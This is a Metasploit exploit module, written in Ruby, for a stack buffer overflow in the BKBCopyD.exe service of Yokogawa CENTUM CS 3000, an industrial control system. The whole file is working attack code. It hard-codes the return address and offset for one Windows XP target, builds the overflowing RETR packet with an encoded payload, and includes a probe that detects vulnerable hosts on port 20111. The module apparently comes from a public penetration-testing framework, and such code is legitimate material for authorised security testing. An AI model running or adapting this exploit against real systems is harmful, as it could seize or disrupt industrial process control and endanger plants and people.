##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Yokogawa CENTUM CS 3000 BKBCopyD.exe Buffer 
Overflow',
      'Description'    => %q{
        This module exploits a stack based buffer overflow in Yokogawa 
CENTUM CS 3000. The vulnerability
        exists in the service BKBCopyD.exe when handling specially 
crafted packets. This module has
        been tested successfully on Yokogawa CENTUM CS 3000 R3.08.50 
over Windows XP SP3.
      },
      'Author'         =>
        [
          'juan vazquez',
          'Redsadic <julian.vilas[at]gmail.com>'
        ],
      'References'     =>
        [
          [ 'URL', 
'http://www.yokogawa.com/dcs/security/ysar/YSAR-14-0001E.pdf' ],
          [ 'URL', 
'https://community.rapid7.com/community/metasploit/blog/2014/03/10/yokogawa-centum-cs3000-vulnerabilities' 
]
        ],
      'Payload'        =>
        {
          'Space'          => 373, # 500 for the full RETR argument
          'DisableNops'    => true,
          'BadChars'       => "\x00\x0d\x0a\xff",
          'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff\xff\xff" # Stack 
adjustment # add esp, -3500 # double \xff char to put it on memory
        },
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Yokogawa CENTUM CS 3000 R3.08.50 / Windows XP SP3',
            {
              'Ret'    => 0x6404625d, # push esp # ret # libBKBUtil.dll]
              'Offset' => 123
            }
          ],
        ],
      'DisclosureDate' => 'Mar 10 2014',
      'DefaultTarget'  => 0))

    register_options(
      [
        Opt::RPORT(20111)
      ], self.class)
  end

  def check
    pkt = build_probe
    res = send_pkt(pkt)
    if valid_response?(res)
      return Exploit::CheckCode::Detected
    end

    Exploit::CheckCode::Safe
  end


  def exploit
    data = "RETR "
    data << rand_text(target['Offset'])
    data << [target.ret].pack("V")
    data << payload.encoded
    data << "\n"

    print_status("Trying target #{target.name}, sending #{data.length} 
bytes...")
    connect
    sock.put(data)
    disconnect
  end

  def build_probe
    "#{rand_text_alpha(10)}\n"
  end

  def send_pkt(data)
    connect
    sock.put(data)
    data = sock.get_once
    disconnect

    return data
  end

  def valid_response?(data)
    return false unless !!data
    return false unless data =~ /500  'yyparse error': command not 
understood/
    return true
  end

end

